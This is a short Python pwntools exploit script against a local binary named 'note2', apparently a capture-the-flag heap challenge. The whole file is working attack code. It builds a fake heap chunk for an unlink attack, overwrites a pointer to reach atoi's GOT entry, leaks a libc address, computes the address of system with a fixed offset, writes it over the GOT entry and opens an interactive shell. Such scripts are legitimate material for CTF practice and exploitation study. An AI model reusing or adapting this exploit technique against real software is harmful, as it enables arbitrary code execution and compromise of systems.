from pwn import *


def send(a,b=':'):
    p.sendlineafter(b,str(a))

def new(size, content):
    send(1, '>>')
    send(size)
    send(content)

def show(index):
    send(2,'>>')
    send(index)

def edit(index,append,input):
    send(3, '>>')
    send(index)
    send(append, '?')
    send(input)

def delete(index):
    send(4, '>>')
    send(index)

p = process('./note2')
send('a'*0x3e)
send('b'*0x5e)


addr = 0x602110
new(0x80, p64(0)+p64(0xa1)+p64(addr-8) + p64(addr))

new(0x8, 'd')
new(0x80,'a')
delete(1)
new(0, p64(0)*2 + p64(0xa0) + p64(0x90))

gdb.attach(p)
delete(2)

atoi_got = 0x602088
edit(0,1,'a'*0x18 + p64(atoi_got))

show(0)

p.readuntil('is ')
leak = p.readuntil('\n')[:-1]
leak = u64(leak.ljust(8,'\x00'))
print hex(leak)
system = leak + 0xe510

edit(0, 1,p64(system))




gdb.attach(p)
p.interactive()
